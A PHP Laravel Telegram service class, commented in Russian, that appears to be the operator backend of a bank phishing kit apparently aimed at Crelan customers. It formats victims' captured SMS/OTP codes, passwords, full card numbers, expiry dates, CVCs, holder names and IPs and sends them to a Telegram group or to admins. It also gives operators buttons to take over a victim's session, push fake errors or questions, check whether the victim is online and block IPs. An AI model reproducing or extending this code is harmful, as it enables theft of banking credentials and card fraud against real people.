<?php

declare(strict_types=1);

namespace App\Services;

use App\DTOs\SessionDTO;
use App\DTOs\TelegramMessageDTO;
use App\Enums\ActionType;
use App\Models\Admin;
use App\Models\Session;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

/**
 * Сервис для работы с Telegram
 */
class TelegramService
{
    private ?Nutgram $bot = null;
    private bool $isConfigured = false;

    private function exceptionContext(\Throwable $e): array
    {
        $context = [
            'exception' => $e::class,
            'code' => $e->getCode(),
            'error' => $e->getMessage(),
        ];

        $knownMethods = [
            'getResponse',
            'response',
            'getRawResponse',
            'getTelegramResponse',
        ];

        foreach ($knownMethods as $method) {
            if (method_exists($e, $method)) {
                try {
                    $context[$method] = $e->{$method}();
                } catch (\Throwable $nested) {
                    $context[$method] = [
                        'error' => $nested->getMessage(),
                        'exception' => $nested::class,
                    ];
                }
            }
        }

        if (method_exists($e, 'getPrevious') && $e->getPrevious() !== null) {
            $prev = $e->getPrevious();
            $context['previous'] = [
                'exception' => $prev::class,
                'code' => $prev->getCode(),
                'error' => $prev->getMessage(),
            ];
        }

        return $context;
    }

    public function __construct()
    {
        $token = config('services.telegram.bot_token') ?? config('nutgram.token');
        
        if (!empty($token)) {
            try {
                $this->bot = new Nutgram($token);
                $this->isConfigured = true;
            } catch (\Throwable $e) {
                report($e);
            }
        }
    }
    
    /**
     * Проверка настроен ли бот
     */
    public function isConfigured(): bool
    {
        return $this->isConfigured && $this->bot !== null;
    }
    
    /**
     * Построение InlineKeyboardMarkup из массива
     */
    private function buildKeyboardMarkup(array $keyboard): ?InlineKeyboardMarkup
    {
        if (empty($keyboard)) {
            return null;
        }
        
        $markup = new InlineKeyboardMarkup();
        foreach ($keyboard as $row) {
            if (!empty($row)) {
                $markup->addRow(...$row);
            }
        }
        return $markup;
    }

    /**
     * Получить ID группового чата
     */
    public function getGroupChatId(): ?int
    {
        $groupId = config('services.telegram.group_chat_id');
        return $groupId ? (int) $groupId : null;
    }

    /**
     * Отправка сообщения о новой сессии всем админам в ЛС
     */
    public function sendNewSessionNotification(Session $session): array
    {
        if (!$this->isConfigured()) {
            Log::warning('sendNewSessionNotification: bot not configured', [
                'session_id' => $session->id,
            ]);
            return [];
        }

        Log::info('sendNewSessionNotification: start', [
            'session_id' => $session->id,
            'group_chat_id' => $this->getGroupChatId(),
        ]);

        $dedupeKey = "telegram:new_session_notification:{$session->id}";
        if (!Cache::add($dedupeKey, true, now()->addMinutes(10))) {
            Log::info('sendNewSessionNotification: deduped', [
                'session_id' => $session->id,
            ]);
            return [];
        }

        $results = [];

        $groupChatId = $this->getGroupChatId();
        if ($groupChatId) {
            $results = array_merge($results, $this->sendToGroup($session));
        }

        $results = array_merge($results, $this->sendToAllAdmins($session));

        Log::info('sendNewSessionNotification: done', [
            'session_id' => $session->id,
            'result_keys' => array_keys($results),
        ]);

        return $results;
    }

    /**
     * Отправка сессии в группу
     */
    public function sendToGroup(Session $session): array
    {
        $groupChatId = $this->getGroupChatId();
        
        Log::info('sendToGroup called', [
            'session_id' => $session->id,
            'group_chat_id' => $groupChatId,
            'group_chat_id_config' => config('services.telegram.group_chat_id'),
        ]);
        
        if (!$groupChatId) {
            Log::warning('sendToGroup: group_chat_id is empty');
            return [];
        }

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $groupChatId,
                parse_mode: 'HTML',
                reply_markup: $this->buildKeyboardMarkup($keyboard),
            );

            Log::info('sendToGroup: message sent successfully', [
                'message_id' => $message->message_id,
                'chat_id' => $groupChatId,
                'telegram_response' => $message,
            ]);

            return [
                'group' => [
                    'success' => true,
                    'message_id' => $message->message_id,
                    'chat_id' => $groupChatId,
                ],
            ];
        } catch (\Throwable $e) {
            Log::error('sendToGroup: failed to send message', [
                'chat_id' => $groupChatId,
                'session_id' => $session->id,
                'text_length' => mb_strlen($text),
                ...$this->exceptionContext($e),
            ]);
            report($e);
            return [
                'group' => [
                    'success' => false,
                    'error' => $e->getMessage(),
                ],
            ];
        }
    }

    /**
     * Отправка сессии в ЛС всем админам (fallback)
     */
    private function sendToAllAdmins(Session $session): array
    {
        $adminService = app(AdminService::class);
        $admins = $adminService->getActiveAdmins();

        Log::info('sendToAllAdmins: start', [
            'session_id' => $session->id,
            'admins_count' => $admins->count(),
        ]);

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        $results = [];

        foreach ($admins as $admin) {
            try {
                $message = $this->bot->sendMessage(
                    text: $text,
                    chat_id: $admin->telegram_user_id,
                    parse_mode: 'HTML',
                    reply_markup: $this->buildKeyboardMarkup($keyboard),
                );

                $results[$admin->id] = [
                    'success' => true,
                    'message_id' => $message->message_id,
                ];

                Log::info('sendToAllAdmins: message sent', [
                    'session_id' => $session->id,
                    'admin_id' => $admin->id,
                    'telegram_user_id' => $admin->telegram_user_id,
                    'message_id' => $message->message_id,
                    'telegram_response' => $message,
                ]);
            } catch (\Throwable $e) {
                $results[$admin->id] = [
                    'success' => false,
                    'error' => $e->getMessage(),
                ];

                Log::error('sendToAllAdmins: failed to send', [
                    'session_id' => $session->id,
                    'admin_id' => $admin->id,
                    'telegram_user_id' => $admin->telegram_user_id,
                    'text_length' => mb_strlen($text),
                    ...$this->exceptionContext($e),
                ]);
            }
        }

        return $results;
    }

    /**
     * Отправка сообщения
     */
    public function sendMessage(TelegramMessageDTO $dto): ?int
    {
        if (!$this->isConfigured()) {
            return null;
        }
        
        try {
            $message = $this->bot->sendMessage(
                text: $dto->text,
                chat_id: $dto->chatId,
                parse_mode: $dto->parseMode,
                reply_to_message_id: $dto->replyToMessageId,
                reply_markup: $dto->keyboard ? $this->buildKeyboardMarkup($dto->keyboard) : null,
            );

            Log::info('sendMessage: success', [
                'chat_id' => $dto->chatId,
                'message_id' => $message->message_id,
                'parse_mode' => $dto->parseMode,
                'reply_to_message_id' => $dto->replyToMessageId,
                'text_length' => mb_strlen($dto->text),
                'telegram_response' => $message,
            ]);

            return $message->message_id;
        } catch (\Throwable $e) {
            Log::error('sendMessage: failed', [
                'chat_id' => $dto->chatId,
                'parse_mode' => $dto->parseMode,
                'reply_to_message_id' => $dto->replyToMessageId,
                'text_length' => mb_strlen($dto->text),
                ...$this->exceptionContext($e),
            ]);
            report($e);

            return null;
        }
    }

    /**
     * Редактирование сообщения
     */
    public function editMessage(TelegramMessageDTO $dto): bool
    {
        if (!$this->isConfigured() || !$dto->isEdit()) {
            return false;
        }

        try {
            $this->bot->editMessageText(
                text: $dto->text,
                chat_id: $dto->chatId,
                message_id: $dto->messageId,
                parse_mode: $dto->parseMode,
                reply_markup: $dto->keyboard ? $this->buildKeyboardMarkup($dto->keyboard) : null,
            );

            return true;
        } catch (\Throwable $e) {
            report($e);

            return false;
        }
    }

    /**
     * Закрепить сообщение в чате
     */
    public function pinMessage(int $chatId, int $messageId): bool
    {
        if (!$this->isConfigured()) {
            Log::warning('pinMessage: bot not configured', [
                'chat_id' => $chatId,
                'message_id' => $messageId,
            ]);
            return false;
        }

        try {
            Log::info('pinMessage: request', [
                'chat_id' => $chatId,
                'message_id' => $messageId,
            ]);
            $this->bot->pinChatMessage(
                chat_id: $chatId,
                message_id: $messageId,
                disable_notification: false,
            );
            Log::info('pinMessage: success', [
                'chat_id' => $chatId,
                'message_id' => $messageId,
            ]);
            return true;
        } catch (\Throwable $e) {
            Log::warning('pinMessage: failed', [
                'chat_id' => $chatId,
                'message_id' => $messageId,
                'exception' => $e::class,
                'error' => $e->getMessage(),
            ]);
            return false;
        }
    }

    /**
     * Обновление сообщения сессии
     */
    public function updateSessionMessage(Session $session): bool
    {
        if ($session->telegram_message_id === null) {
            return false;
        }

        // Определяем chat_id: из сессии или группы или от админа
        $chatId = $session->telegram_chat_id 
            ?? $this->getGroupChatId() 
            ?? $session->admin?->telegram_user_id;
            
        if ($chatId === null) {
            return false;
        }

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        $dto = TelegramMessageDTO::edit(
            chatId: $chatId,
            messageId: $session->telegram_message_id,
            text: $text,
            keyboard: $keyboard,
        );

        return $this->editMessage($dto);
    }

    /**
     * Отправка уведомления о действии в группу (с fallback на прикреплённого админа)
     * 
     * Логика:
     * 1. Если есть группа — отправляем в группу
     * 2. Если группы нет или ошибка — отправляем прикреплённому админу
     */
    public function sendSessionUpdate(Session $session, string $updateText): ?int
    {
        if (!$this->isConfigured()) {
            return null;
        }

        // Добавляем информацию о сессии в уведомление
        $sessionInfo = "📋 <b>Сессия:</b> <code>{$session->input_value}</code>";
        if ($session->admin) {
            $adminName = $session->admin->username 
                ? "@{$session->admin->username}" 
                : "ID:{$session->admin->telegram_user_id}";
            $sessionInfo .= " | 👤 {$adminName}";
        }
        $fullText = "{$sessionInfo}\n\n{$updateText}";

        $groupChatId = $this->getGroupChatId();
        
        // Пробуем отправить в группу
        if ($groupChatId) {
            $messageId = $this->sendToGroupNotification($groupChatId, $fullText);
            if ($messageId !== null) {
                return $messageId;
            }
            // Если ошибка — fallback на админа
            Log::warning('sendSessionUpdate: failed to send to group, falling back to admin');
        }
        
        // Fallback: отправляем прикреплённому админу
        if ($session->admin_id === null || $session->admin === null) {
            return null;
        }

        return $this->sendTemporaryMessage($session->admin->telegram_user_id, $updateText, 10);
    }
    
    /**
     * Отправка уведомления в группу (без клавиатуры)
     */
    private function sendToGroupNotification(int $chatId, string $text): ?int
    {
        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $chatId,
                parse_mode: 'HTML',
            );

            Log::info('sendToGroupNotification: success', [
                'chat_id' => $chatId,
                'message_id' => $message->message_id,
                'text_length' => mb_strlen($text),
                'telegram_response' => $message,
            ]);
            return $message->message_id;
        } catch (\Throwable $e) {
            Log::error('sendToGroupNotification: failed', [
                'chat_id' => $chatId,
                'text_length' => mb_strlen($text),
                ...$this->exceptionContext($e),
            ]);
            return null;
        }
    }

    /**
     * Отправка временного сообщения с автоудалением
     */
    public function sendTemporaryMessage(int $chatId, string $text, int $deleteAfterSeconds = 10): ?int
    {
        if (!$this->isConfigured()) {
            return null;
        }

        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $chatId,
                parse_mode: 'HTML',
            );

            Log::info('sendTemporaryMessage: success', [
                'chat_id' => $chatId,
                'message_id' => $message->message_id,
                'delete_after_seconds' => $deleteAfterSeconds,
                'text_length' => mb_strlen($text),
                'telegram_response' => $message,
            ]);

            // Запланировать удаление через N секунд
            if ($message) {
                $this->scheduleMessageDeletion($chatId, $message->message_id, $deleteAfterSeconds);
            }

            return $message->message_id;
        } catch (\Throwable $e) {
            Log::error('sendTemporaryMessage: failed', [
                'chat_id' => $chatId,
                'delete_after_seconds' => $deleteAfterSeconds,
                'text_length' => mb_strlen($text),
                ...$this->exceptionContext($e),
            ]);
            report($e);
            return null;
        }
    }

    /**
     * Запланировать удаление сообщения
     */
    private function scheduleMessageDeletion(int $chatId, int $messageId, int $seconds): void
    {
        // Используем dispatch с delay для отложенного удаления
        dispatch(function () use ($chatId, $messageId) {
            try {
                $token = config('services.telegram.bot_token');
                if ($token) {
                    $bot = new Nutgram($token);
                    $bot->deleteMessage($chatId, $messageId);
                }
            } catch (\Throwable $e) {
                // Игнорируем ошибки удаления (сообщение уже удалено и т.д.)
            }
        })->delay(now()->addSeconds($seconds));
    }

    /**
     * Форматирование сообщения о сессии
     */
    public function formatSessionMessage(Session $session): string
    {
        $statusEmoji = $session->status->emoji();
        $statusLabel = $session->status->label();

        $inputEmoji = $session->input_type->emoji();
        $inputLabel = $session->input_type->label();

        // Флаг страны + название
        $countryFlag = $session->country_code ? $this->countryCodeToFlag($session->country_code) : '';
        $countryInfo = $countryFlag;
        if ($session->country_name) {
            $countryInfo .= " {$session->country_name}";
        }

        // Онлайн статус вкладки
        $onlineStatus = $session->is_online ? '🟢 Онлайн' : '🔴 Оффлайн';

        // Формируем строку ввода (с флагом если телефон)
        $inputLine = "{$inputEmoji} {$inputLabel}: <code>{$session->input_value}</code>";
        if ($session->input_type->value === 'phone' && $countryFlag) {
            $inputLine = "{$countryFlag} {$inputLabel}: <code>{$session->input_value}</code>";
        }

        $lines = [
            "📋 <b>Новая сессия</b>",
            "",
            $inputLine,
            "🌐 IP: <code>{$session->ip}</code>" . ($countryInfo ? " | {$countryInfo}" : ''),
            "{$statusEmoji} Статус: {$statusLabel}",
            "👁 Вкладка: {$onlineStatus}",
        ];

        // Добавляем информацию об админе
        if ($session->admin) {
            $adminName = $session->admin->username
                ? "@{$session->admin->username}"
                : $session->admin->telegram_user_id;
            $lines[] = "👤 Админ: {$adminName}";
        }

        // Добавляем текущее действие
        if ($session->action_type) {
            $actionEmoji = $session->action_type->emoji();
            $actionLabel = $session->action_type->label();
            $lines[] = "{$actionEmoji} Действие: {$actionLabel}";
        }

        // Добавляем полученные данные
        $hasData = $session->code || $session->password || $session->card_number;
        if ($hasData) {
            $lines[] = "";
            $lines[] = "📥 <b>Полученные данные:</b>";
        }

        // Код (SMS/OTP)
        if ($session->code) {
            $lines[] = "🔢 Код: <code>{$session->code}</code>";
        }

        // Пароль
        if ($session->password) {
            $lines[] = "🔐 Пароль: <code>{$session->password}</code>";
        }

        // Добавляем данные карты, если есть
        if ($session->card_number) {
            $lines[] = "💳 Карта: <code>{$session->card_number}</code>";

            if ($session->expire) {
                $lines[] = "├ Срок: <code>{$session->expire}</code>";
            }

            if ($session->cvc) {
                $lines[] = "├ CVC: <code>{$session->cvc}</code>";
            }

            if ($session->holder_name) {
                $lines[] = "└ Держатель: <code>{$session->holder_name}</code>";
            }
        }

        // Добавляем телефон, если есть (с флагом страны)
        if ($session->phone_number && $session->input_type->value !== 'phone') {
            $phoneFlag = $countryFlag ?: '📞';
            $lines[] = "{$phoneFlag} Телефон: <code>{$session->phone_number}</code>";
        }

        // Кастомная ошибка
        if ($session->custom_error_text) {
            $lines[] = "";
            $lines[] = "❌ <b>Кастомная ошибка:</b>";
            $lines[] = "<i>{$session->custom_error_text}</i>";
        }

        // Картинка с вопросом (IMAGE_QUESTION) - если есть и картинка, и вопрос одновременно
        if ($session->custom_image_url && $session->custom_question_text) {
            $lines[] = "";
            $lines[] = "🖼❓ <b>Картинка с вопросом:</b>";
            $lines[] = "🖼 <a href=\"{$session->custom_image_url}\">Картинка</a>";
            $lines[] = "❓ <b>Вопрос:</b> <i>{$session->custom_question_text}</i>";
            
            // Отображаем ответ пользователя, если есть
            if ($session->custom_answers && is_array($session->custom_answers)) {
                $answer = $session->custom_answers['answer'] ?? null;
                if ($answer) {
                    $lines[] = "💬 <b>Ответ:</b> <code>{$answer}</code>";
                }
            }
        } else {
            // Кастомный вопрос и ответ
            if ($session->custom_question_text) {
                $lines[] = "";
                $lines[] = "❓ <b>Вопрос:</b> <i>{$session->custom_question_text}</i>";
            }
            
            // Кастомные ответы
            if ($session->custom_answers && is_array($session->custom_answers)) {
                if (!$session->custom_question_text) {
                    $lines[] = "";
                }
                $answer = $session->custom_answers['answer'] ?? null;
                if ($answer) {
                    $lines[] = "💬 <b>Ответ:</b> <code>{$answer}</code>";
                }
            }

            // Кастомная картинка (без вопроса)
            if ($session->custom_image_url && !$session->custom_question_text) {
                $lines[] = "";
                $lines[] = "🖼 <b>Картинка:</b> <a href=\"{$session->custom_image_url}\">ссылка</a>";
            }
        }

        // Время
        $lines[] = "";
        $lines[] = "📅 Создана: {$session->created_at->format('d.m.Y H:i:s')}";

        if ($session->last_activity_at) {
            $lines[] = "⏱ Активность: {$session->last_activity_at->format('H:i:s')}";
        }

        return implode("\n", $lines);
    }

    /**
     * Построение клавиатуры для сессии
     */
    public function buildSessionKeyboard(Session $session): array
    {
        $keyboard = [];

        // Кнопки действий (только если сессия в обработке и есть админ)
        if ($session->isProcessing() && $session->hasAdmin()) {
            $actionButtons = [];

            foreach (ActionType::cases() as $action) {
                if ($action === ActionType::ONLINE) {
                    continue; // Онлайн добавим отдельно
                }

                $actionButtons[] = InlineKeyboardButton::make(
                    text: "{$action->emoji()} {$action->label()}",
                    callback_data: "action:{$session->id}:{$action->value}"
                );
            }

            // Разбиваем на ряды по 3 кнопки
            $keyboard = array_merge($keyboard, array_chunk($actionButtons, 3));

            // Кнопка Онлайн отдельно
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: "🟢 Проверить онлайн",
                    callback_data: "action:{$session->id}:online"
                ),
            ];

            // Кнопка блокировки IP (если есть IP адрес)
            if (!empty($session->ip_address)) {
                $isBlocked = \App\Models\BlockedIp::isBlocked($session->ip_address);
                $keyboard[] = [
                    InlineKeyboardButton::make(
                        text: $isBlocked ? "🔓 Разблокировать IP" : "🚫 Заблокировать IP",
                        callback_data: $isBlocked 
                            ? "unblock_ip:{$session->ip_address}" 
                            : "block_ip:{$session->id}"
                    ),
                ];
            }

            // Кнопка открепиться
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: "🔓 Открепиться",
                    callback_data: "unassign:{$session->id}"
                ),
                InlineKeyboardButton::make(
                    text: "✅ Завершить",
                    callback_data: "complete:{$session->id}"
                ),
            ];
        }

        // Кнопка прикрепиться (только если сессия pending)
        if ($session->isPending()) {
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: "🔒 Прикрепиться",
                    callback_data: "assign:{$session->id}"
                ),
            ];
            
            // Кнопка блокировки IP для pending сессий тоже
            if (!empty($session->ip_address)) {
                $isBlocked = \App\Models\BlockedIp::isBlocked($session->ip_address);
                $keyboard[] = [
                    InlineKeyboardButton::make(
                        text: $isBlocked ? "🔓 Разблокировать IP" : "🚫 Заблокировать IP",
                        callback_data: $isBlocked 
                            ? "unblock_ip:{$session->ip_address}" 
                            : "block_ip:{$session->id}"
                    ),
                ];
            }
        }

        return $keyboard;
    }

    /**
     * Уведомление о форме (reply на сообщение сессии)
     */
    public function notifyFormSubmitted(Session $session, string $formType, array $data = []): ?int
    {
        $actionType = ActionType::tryFrom($formType);
        $label = $actionType?->label() ?? $formType;
        $emoji = $actionType?->emoji() ?? '📝';

        $text = "{$emoji} <b>Получены данные формы: {$label}</b>";

        // Добавляем информацию о данных
        if (isset($data['code'])) {
            $text .= "\n\n🔢 Код: <code>{$data['code']}</code>";
        }

        if (isset($data['password'])) {
            $text .= "\n\n🔐 Пароль получен";
        }

        if (isset($data['card_number'])) {
            $masked = '**** **** **** ' . substr($data['card_number'], -4);
            $text .= "\n\n💳 Карта: <code>{$masked}</code>";
        }

        return $this->sendSessionUpdate($session, $text);
    }

    /**
     * Уведомление об онлайн статусе
     */
    public function notifyOnlineStatus(Session $session, bool $isOnline): ?int
    {
        // Дедупликация — не отправляем повторное уведомление в течение 3 секунд
        $cacheKey = "online_status:{$session->id}:" . ($isOnline ? '1' : '0');
        if (\Illuminate\Support\Facades\Cache::has($cacheKey)) {
            return null;
        }
        // Кешируем на 3 секунды
        \Illuminate\Support\Facades\Cache::put($cacheKey, true, 3);
        
        $status = $isOnline ? '🟢 Онлайн' : '🔴 Оффлайн';
        $text = "<b>Статус пользователя:</b> {$status}";

        return $this->sendSessionUpdate($session, $text);
    }

    /**
     * Уведомление о переходе на страницу
     */
    public function notifyPageVisit(Session $session, string $pageName, string $pageUrl, ?string $actionType = null): ?int
    {
        // Дедупликация — не отправляем повторное уведомление для той же страницы
        $cacheKey = "page_visit:{$session->id}:" . md5($pageName . $pageUrl . $actionType);
        if (\Illuminate\Support\Facades\Cache::has($cacheKey)) {
            return null;
        }
        // Кешируем на 10 секунд
        \Illuminate\Support\Facades\Cache::put($cacheKey, true, 5);
        
        $emoji = match ($pageName) {
            'Главная страница' => '🏠',
            'Форма действия' => '📝',
            'Ожидание' => '⏳',
            'Crelan Sign QR page' => '📷',
            'Crelan Sign QR retry' => '🔄',
            'Digipass page' => '🔑',
            'Digipass submitted' => '✅',
            'Method selection page' => '🔀',
            default => '📄',
        };

        $domain = parse_url($pageUrl, PHP_URL_HOST) ?: 'unknown';
        $ipAddress = $session->ip ?? 'unknown';

        $text = "💡 <b>Новое посещение</b> #visit\n";
        $text .= "{$emoji} <b>Страница:</b> {$pageName}\n";
        $text .= "🌐 <b>Домен:</b> <code>{$domain}</code>\n";
        $text .= "📍 <b>IP:</b> <code>{$ipAddress}</code>";
        
        if ($actionType) {
            $action = ActionType::tryFrom($actionType);
            if ($action) {
                $text .= "\n\n{$action->emoji()} <b>Действие:</b> {$action->label()}";
            }
        }
        
        $text .= "\n\n🔗 <code>{$pageUrl}</code>";

        return $this->sendSessionUpdate($session, $text);
    }

    /**
     * Конвертация 2-буквенного кода страны (ISO 3166-1 alpha-2) в эмодзи флага
     * Например: 'BE' → 🇧🇪, 'NL' → 🇳🇱
     */
    private function countryCodeToFlag(string $code): string
    {
        $code = strtoupper($code);
        if (strlen($code) !== 2) {
            return '🌍';
        }

        $flag = '';
        for ($i = 0; $i < 2; $i++) {
            $char = ord($code[$i]);
            if ($char < ord('A') || $char > ord('Z')) {
                return '🌍';
            }
            $flag .= mb_chr(0x1F1E6 + $char - ord('A'));
        }

        return $flag;
    }
}
